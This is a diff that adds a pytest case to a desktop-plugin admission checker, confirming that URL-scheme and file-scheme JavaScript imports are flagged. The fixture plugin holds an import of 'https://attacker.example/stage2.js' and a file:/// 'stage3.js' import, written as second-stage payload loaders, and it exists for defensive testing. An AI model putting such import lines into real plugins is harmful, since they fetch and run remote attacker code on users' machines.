@@ -276,3 +276,19 @@ class TestDesktopSurface:
         assert "dynamic import outside the SDK (desktop/plugin.js:1)" in failed["desktop surface"]
         assert desktop_surface_hits(d) == ["dynamic import outside the SDK (desktop/plugin.js:1)"]
         assert is_desktop_surface("desktop/plugin.js")
+
+    def test_static_url_import_is_refused_like_the_dynamic_one(self, tmp_path):
+        """`import 'https://…'` is a one-line second stage the dynamic-import rule never saw; the
+        loader refuses URL-scheme specifiers, so admission must too. SDK/react imports stay clean."""
+        d = self._desktop_plugin(
+            tmp_path,
+            "import { host } from '@hermes/plugin-sdk'\n"
+            "import React from \"react\"\n"
+            "import 'https://attacker.example/stage2.js'\n"
+            "import stage from \"file:///tmp/stage3.js\"\n"
+            "const note = 'see https://example.com'\n",
+        )
+        assert desktop_surface_hits(d) == [
+            "remote import outside the SDK (desktop/plugin.js:3)",
+            "remote import outside the SDK (desktop/plugin.js:4)",
+        ]
